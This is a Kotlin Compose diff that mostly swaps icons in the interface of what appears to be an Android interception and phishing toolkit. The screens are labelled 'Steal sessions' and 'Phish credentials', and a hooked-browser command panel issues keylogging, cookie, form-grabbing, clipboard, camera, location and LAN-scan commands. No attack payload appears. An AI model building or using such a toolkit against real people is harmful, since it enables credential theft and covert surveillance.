@@ -343,7 +343,7 @@ fun DashboardScreen(
         item {
             Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                 GlowStatCard("Devices", "${devices.size}", CgCyan, Icons.Filled.Devices, Modifier.weight(1f)) { navigateTo(Screen.DEVICES) }
-                GlowStatCard("Hooked", "${hookedSessions.count { it.isAlive }}", CgMagenta, Icons.Filled.FishingOutlined, Modifier.weight(1f)) { navigateTo(Screen.HOOKED) }
+                GlowStatCard("Hooked", "${hookedSessions.count { it.isAlive }}", CgMagenta, Icons.Filled.BugReport, Modifier.weight(1f)) { navigateTo(Screen.HOOKED) }
                 GlowStatCard("Creds", "${credentials.size}", CgRed, Icons.Filled.Key, Modifier.weight(1f)) { navigateTo(Screen.CREDENTIALS) }
             }
         }
@@ -386,14 +386,14 @@ fun DashboardScreen(
             Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                 Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                     ActionCard("QR Setup", "Configure target proxy", Icons.Filled.QrCode, CgGreen, Modifier.weight(1f)) { navigateTo(Screen.SETUP) }
-                    ActionCard("Network\nScan", "Discover devices", Icons.Filled.Radar, CgCyan, Modifier.weight(1f)) { navigateTo(Screen.NETWORK) }
+                    ActionCard("Network\nScan", "Discover devices", Icons.Filled.Search, CgCyan, Modifier.weight(1f)) { navigateTo(Screen.NETWORK) }
                 }
                 Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                     ActionCard("Hijack", "Steal sessions", Icons.Filled.Lock, CgRed, Modifier.weight(1f)) { navigateTo(Screen.HIJACK) }
                     ActionCard("Portal", "Phish credentials", Icons.Filled.Wifi, CgAmber, Modifier.weight(1f)) { navigateTo(Screen.CAPTIVE) }
                 }
                 Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
-                    ActionCard("WS Frames", "WebSocket capture", Icons.Filled.Cable, CgPurple, Modifier.weight(1f)) { navigateTo(Screen.WEBSOCKET) }
+                    ActionCard("WS Frames", "WebSocket capture", Icons.Filled.Power, CgPurple, Modifier.weight(1f)) { navigateTo(Screen.WEBSOCKET) }
                     ActionCard("Alerts", "Telegram & webhooks", Icons.Filled.Notifications, CgBlue, Modifier.weight(1f)) { navigateTo(Screen.ALERTS) }
                 }
                 Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
@@ -642,13 +642,13 @@ fun RichPacketRow(pkt: InterceptedPacket, onClick: () -> Unit) {
 
 fun getContentIcon(type: ContentCategory) = when(type) {
     ContentCategory.LOGIN_FORM -> Icons.Filled.Key
-    ContentCategory.JSON_API -> Icons.Filled.DataArray
+    ContentCategory.JSON_API -> Icons.Filled.List
     ContentCategory.IMAGE -> Icons.Filled.Image
     ContentCategory.HTML_PAGE -> Icons.Filled.Code
     ContentCategory.JAVASCRIPT -> Icons.Filled.Code
     ContentCategory.CSS -> Icons.Filled.Brush
     ContentCategory.REDIRECT -> Icons.Filled.CallMissedOutgoing
-    ContentCategory.COOKIE_SESSION -> Icons.Filled.Cookie
+    ContentCategory.COOKIE_SESSION -> Icons.Filled.Circle
     ContentCategory.AUTH_HEADER -> Icons.Filled.Security
     ContentCategory.BINARY -> Icons.Filled.FileCopy
     else -> Icons.Filled.Description
@@ -700,8 +700,8 @@ fun PacketInspectorDialog(pkt: InterceptedPacket, onDismiss: () -> Unit) {
                 // tab row
                 ScrollableTabRow(selectedTabIndex = tab, containerColor = CgSurface,
                     contentColor = CgGreen, edgePadding = 8.dp,
-                    indicator = @Composable { tabPositions: List<TabPosition> ->
-                        TabRowDefaults.SecondaryIndicator(Modifier.tabIndicatorOffset(tabPositions[tab]), color = CgGreen, height = 2.dp)
+                    indicator = { tabPositions ->
+                        TabRowDefaults.SecondaryIndicator(modifier = Modifier.fillMaxWidth().wrapContentSize(Alignment.BottomStart).width(tabPositions[tab].width).offset(x = tabPositions[tab].left), color = CgGreen, height = 2.dp)
                     }) {
                     tabs.forEachIndexed { i, title ->
                         Tab(selected = tab == i, onClick = { tab = i },
@@ -1126,7 +1126,7 @@ fun RichDeviceCard(device: ConnectedDevice, scanResult: PortScanResult?, onSetNi
                 OutlinedButton(onClick = { onPortScan(device.ip) }, shape = RoundedCornerShape(8.dp),
                     border = BorderStroke(1.dp, CgOrange.copy(0.4f)), modifier = Modifier.weight(1f),
                     contentPadding = PaddingValues(horizontal = 8.dp, vertical = 6.dp)) {
-                    Icon(Icons.Filled.DocumentScanner, contentDescription = null, tint = CgOrange, modifier = Modifier.size(12.dp))
+                    Icon(Icons.Filled.Search, contentDescription = null, tint = CgOrange, modifier = Modifier.size(12.dp))
                     Spacer(Modifier.width(4.dp))
                     Text("Port Scan", fontSize = 10.sp, color = CgOrange)
                 }
@@ -1182,7 +1182,7 @@ fun DiscoveredHostCard(host: NetworkHost, scanResult: PortScanResult?, onPortSca
                 Badge(containerColor = CgAmber.copy(0.2f)) { Text("NO PROXY", fontSize = 7.sp, color = CgAmber, modifier = Modifier.padding(horizontal = 4.dp)) }
                 Spacer(Modifier.height(4.dp))
                 IconButton(onClick = { onPortScan(host.ip) }, modifier = Modifier.size(28.dp)) {
-                    Icon(Icons.Filled.DocumentScanner, contentDescription = null, tint = CgOrange, modifier = Modifier.size(14.dp))
+                    Icon(Icons.Filled.Search, contentDescription = null, tint = CgOrange, modifier = Modifier.size(14.dp))
                 }
             }
         }
@@ -1198,9 +1198,9 @@ fun MiniStat(label: String, value: String, color: Color) {
 }
 
 fun getOsIcon(os: String) = when {
-    os.contains("Android", true) -> Icons.Filled.Android
+    os.contains("Android", true) -> Icons.Filled.PhoneAndroid
     os.contains("iOS", true) || os.contains("iPhone", true) || os.contains("iPad", true) -> Icons.Filled.Phone
-    os.contains("Windows", true) -> Icons.Filled.Window
+    os.contains("Windows", true) -> Icons.Filled.Laptop
     os.contains("Mac", true) -> Icons.Filled.Laptop
     os.contains("Linux", true) -> Icons.Filled.Computer
     os.contains("Chrome", true) -> Icons.Filled.Web
@@ -1221,7 +1221,7 @@ fun HookedScreen(sessions: List<HookedSession>, events: List<C2Event>, onCommand
             Text("${sessions.count { it.isAlive }} live sessions", fontSize = 12.sp, color = CgGray)
         }
         if (sessions.isEmpty()) {
-            item { EmptyState(Icons.Filled.FishingOutlined, "No hooked sessions", "Hook agent loads when target visits HTTP page via your proxy") }
+            item { EmptyState(Icons.Filled.BugReport, "No hooked sessions", "Hook agent loads when target visits HTTP page via your proxy") }
         }
         items(sessions.filter { it.isAlive }) { session ->
             val isSelected = selectedSession == session.sessionId
@@ -1233,7 +1233,7 @@ fun HookedScreen(sessions: List<HookedSession>, events: List<C2Event>, onCommand
                     Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                         Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.weight(1f)) {
                             Box(Modifier.size(40.dp).clip(RoundedCornerShape(10.dp)).background(CgMagenta.copy(0.15f)), contentAlignment = Alignment.Center) {
-                                Icon(Icons.Filled.FishingOutlined, contentDescription = null, tint = CgMagenta, modifier = Modifier.size(20.dp))
+                                Icon(Icons.Filled.BugReport, contentDescription = null, tint = CgMagenta, modifier = Modifier.size(20.dp))
                             }
                             Spacer(Modifier.width(10.dp))
                             Column {
@@ -1256,21 +1256,21 @@ fun HookedScreen(sessions: List<HookedSession>, events: List<C2Event>, onCommand
                         // command grid
                         Text("COMMANDS", fontSize = 9.sp, color = CgGray, letterSpacing = 1.sp, modifier = Modifier.padding(bottom = 8.dp))
                         FlowRow(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp), verticalArrangement = Arrangement.spacedBy(6.dp)) {
-                            HookCmd("Screenshot", Icons.Filled.Screenshot, CgCyan) { onCommand(session.sessionId, "screenshot", emptyMap()) }
+                            HookCmd("Screenshot", Icons.Filled.Camera, CgCyan) { onCommand(session.sessionId, "screenshot", emptyMap()) }
                             HookCmd("Keylog ON", Icons.Filled.Keyboard, CgMagenta) { onCommand(session.sessionId, "keylog_start", emptyMap()) }
-                            HookCmd("Keylog OFF", Icons.Filled.KeyboardHide, CgGray) { onCommand(session.sessionId, "keylog_stop", emptyMap()) }
-                            HookCmd("Cookies", Icons.Filled.Cookie, CgAmber) { onCommand(session.sessionId, "get_cookies", emptyMap()) }
+                            HookCmd("Keylog OFF", Icons.Filled.Keyboard, CgGray) { onCommand(session.sessionId, "keylog_stop", emptyMap()) }
+                            HookCmd("Cookies", Icons.Filled.Circle, CgAmber) { onCommand(session.sessionId, "get_cookies", emptyMap()) }
                             HookCmd("Storage", Icons.Filled.Storage, CgAmber) { onCommand(session.sessionId, "get_storage", emptyMap()) }
-                            HookCmd("Forms", Icons.Filled.Assignment, CgRed) { onCommand(session.sessionId, "form_grab", emptyMap()) }
+                            HookCmd("Forms", Icons.Filled.List, CgRed) { onCommand(session.sessionId, "form_grab", emptyMap()) }
                             HookCmd("Form Tap", Icons.Filled.TouchApp, CgRed) { onCommand(session.sessionId, "form_intercept_start", emptyMap()) }
-                            HookCmd("Clipboard", Icons.Filled.ContentPaste, CgDimGreen) { onCommand(session.sessionId, "get_clipboard", emptyMap()) }
+                            HookCmd("Clipboard", Icons.Filled.ContentCopy, CgDimGreen) { onCommand(session.sessionId, "get_clipboard", emptyMap()) }
                             HookCmd("Clip Mon", Icons.Filled.Monitor, CgDimGreen) { onCommand(session.sessionId, "clipboard_monitor_start", emptyMap()) }
                             HookCmd("Location", Icons.Filled.LocationOn, CgBlue) { onCommand(session.sessionId, "get_location", emptyMap()) }
                             HookCmd("Camera", Icons.Filled.Camera, CgRed) { onCommand(session.sessionId, "camera_snap", emptyMap()) }
-                            HookCmd("DOM", Icons.Filled.AccountTree, CgGray) { onCommand(session.sessionId, "get_dom", emptyMap()) }
+                            HookCmd("DOM", Icons.Filled.Share, CgGray) { onCommand(session.sessionId, "get_dom", emptyMap()) }
                             HookCmd("Device Info", Icons.Filled.Info, CgPurple) { onCommand(session.sessionId, "get_device_info", emptyMap()) }
-                            HookCmd("Port Scan", Icons.Filled.DocumentScanner, CgOrange) { onCommand(session.sessionId, "port_scan", mapOf("targets" to listOf("192.168.1.1"))) }
-                            HookCmd("LAN Probe", Icons.Filled.Radar, CgOrange) { onCommand(session.sessionId, "lan_probe", mapOf("subnet" to "192.168.1")) }
+                            HookCmd("Port Scan", Icons.Filled.Search, CgOrange) { onCommand(session.sessionId, "port_scan", mapOf("targets" to listOf("192.168.1.1"))) }
+                            HookCmd("LAN Probe", Icons.Filled.Search, CgOrange) { onCommand(session.sessionId, "lan_probe", mapOf("subnet" to "192.168.1")) }
                         }
 
                         Spacer(Modifier.height(10.dp))
@@ -1344,7 +1344,7 @@ fun NetworkMapScreen(hosts: List<NetworkHost>, isScanning: Boolean, onScan: () -
                     colors = ButtonDefaults.buttonColors(containerColor = CgCyan.copy(0.15f)),
                     shape = RoundedCornerShape(12.dp), border = BorderStroke(1.dp, CgCyan.copy(0.5f))) {
                     if (isScanning) CircularProgressIndicator(modifier = Modifier.size(14.dp), color = CgCyan, strokeWidth = 2.dp)
-                    else Icon(Icons.Filled.Radar, contentDescription = null, tint = CgCyan, modifier = Modifier.size(14.dp))
+                    else Icon(Icons.Filled.Search, contentDescription = null, tint = CgCyan, modifier = Modifier.size(14.dp))
                     Spacer(Modifier.width(6.dp))
                     Text(if (isScanning) "Scanning..." else "Scan Network", color = CgCyan, fontSize = 12.sp)
                 }
@@ -1389,9 +1389,9 @@ fun StatsScreen(stats: TrafficStats) {
         item { Text("Traffic Analytics", fontSize = 20.sp, fontWeight = FontWeight.Black, color = CgWhite) }
         item {
             Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
-                GlowStatCard("Packets", "${stats.totalPackets.get()}", CgAmber, Icons.Filled.SwapVert, Modifier.weight(1f))
-                GlowStatCard("Traffic", formatBytes(stats.totalBytes.get()), CgBlue, Icons.Filled.DataUsage, Modifier.weight(1f))
-                GlowStatCard("Domains", "${topDomains.size}", CgPurple, Icons.Filled.Language, Modifier.weight(1f))
+                GlowStatCard("Packets", "${stats.totalPackets.get()}", CgAmber, Icons.Filled.SwapVert, Modifier.weight(1f)) {}
+                GlowStatCard("Traffic", formatBytes(stats.totalBytes.get()), CgBlue, Icons.Filled.DataUsage, Modifier.weight(1f)) {}
+                GlowStatCard("Domains", "${topDomains.size}", CgPurple, Icons.Filled.Language, Modifier.weight(1f)) {}
             }
         }
         if (bwHistory.isNotEmpty()) {
@@ -1492,7 +1492,7 @@ fun HijackScreen(sessions: List<HijackSession>, onHijack: (HijackSession) -> Uni
                             Button(onClick = { onHijack(session) },
                                 colors = ButtonDefaults.buttonColors(containerColor = CgRed.copy(0.2f)),
                                 shape = RoundedCornerShape(10.dp), border = BorderStroke(1.dp, CgRed.copy(0.5f))) {
-                                Icon(Icons.Filled.OpenInBrowser, contentDescription = null, tint = CgRed, modifier = Modifier.size(14.dp))
+                                Icon(Icons.Filled.Launch, contentDescription = null, tint = CgRed, modifier = Modifier.size(14.dp))
                                 Spacer(Modifier.width(4.dp))
                                 Text("Hijack", color = CgRed, fontSize = 11.sp)
                             }
@@ -1603,7 +1603,7 @@ fun WebSocketScreen(frames: List<WebSocketFrame>) {
             Badge(containerColor = CgPurple.copy(0.2f)) { Text("${frames.size}", fontSize = 12.sp, color = CgPurple, modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp)) }
         }
         if (frames.isEmpty()) {
-            EmptyState(Icons.Filled.Cable, "No WS frames captured", "WS frames appear after target sites use WebSocket connections")
+            EmptyState(Icons.Filled.Power, "No WS frames captured", "WS frames appear after target sites use WebSocket connections")
         } else {
             LazyColumn(Modifier.fillMaxSize().padding(horizontal = 12.dp), verticalArrangement = Arrangement.spacedBy(4.dp)) {
                 items(frames.reversed()) { frame ->
@@ -1789,7 +1789,7 @@ fun SettingsScreen(
                     Spacer(Modifier.height(8.dp))
                     profiles.forEach { name ->
                         Row(Modifier.fillMaxWidth().padding(vertical = 4.dp), verticalAlignment = Alignment.CenterVertically) {
-                            Icon(Icons.Filled.FolderOpen, contentDescription = null, tint = CgAmber, modifier = Modifier.size(14.dp))
+                            Icon(Icons.Filled.Folder, contentDescription = null, tint = CgAmber, modifier = Modifier.size(14.dp))
                             Spacer(Modifier.width(8.dp))
                             Text(name, fontSize = 12.sp, color = CgWhite, modifier = Modifier.weight(1f))
                             TextButton(onClick = { onLoadProfile(name) }) { Text("Load", fontSize = 11.sp, color = CgCyan) }
@@ -1816,7 +1816,7 @@ fun SettingsScreen(
                         Spacer(Modifier.height(8.dp))
                         savedSessions.forEach { name ->
                             Row(Modifier.fillMaxWidth().padding(vertical = 3.dp), verticalAlignment = Alignment.CenterVertically) {
-                                Icon(Icons.Filled.InsertDriveFile, contentDescription = null, tint = CgGray, modifier = Modifier.size(14.dp))
+                                Icon(Icons.Filled.Description, contentDescription = null, tint = CgGray, modifier = Modifier.size(14.dp))
                                 Spacer(Modifier.width(6.dp))
                                 Text(name, fontSize = 11.sp, color = CgWhite, modifier = Modifier.weight(1f), maxLines = 1, overflow = TextOverflow.Ellipsis)
                                 TextButton(onClick = { onShareSession(name) }) { Text("Share", fontSize = 10.sp, color = CgCyan) }
@@ -1838,10 +1838,10 @@ fun SettingsScreen(
                     SettingsRow("Export CA Certificate", Icons.Filled.Security, CgAmber, onExportCa)
                     SettingsRow("QR Proxy Setup", Icons.Filled.QrCode, CgGreen) { navigateTo(Screen.SETUP) }
                     SettingsRow("Live Alerts (Telegram/Webhook)", Icons.Filled.Notifications, CgBlue) { navigateTo(Screen.ALERTS) }
-                    SettingsRow("Network Map", Icons.Filled.Radar, CgCyan) { navigateTo(Screen.NETWORK) }
+                    SettingsRow("Network Map", Icons.Filled.Search, CgCyan) { navigateTo(Screen.NETWORK) }
                     SettingsRow("Captive Portal", Icons.Filled.Wifi, CgAmber) { navigateTo(Screen.CAPTIVE) }
-                    SettingsRow("WebSocket Frames", Icons.Filled.Cable, CgPurple) { navigateTo(Screen.WEBSOCKET) }
-                    SettingsRow("Hooked Sessions", Icons.Filled.FishingOutlined, CgMagenta) { navigateTo(Screen.HOOKED) }
+                    SettingsRow("WebSocket Frames", Icons.Filled.Power, CgPurple) { navigateTo(Screen.WEBSOCKET) }
+                    SettingsRow("Hooked Sessions", Icons.Filled.BugReport, CgMagenta) { navigateTo(Screen.HOOKED) }
                     SettingsRow("Traffic Stats", Icons.Filled.BarChart, CgBlue) { navigateTo(Screen.STATS) }
                     SettingsRow("About", Icons.Filled.Info, CgDimGreen) { navigateTo(Screen.ABOUT) }
                 }
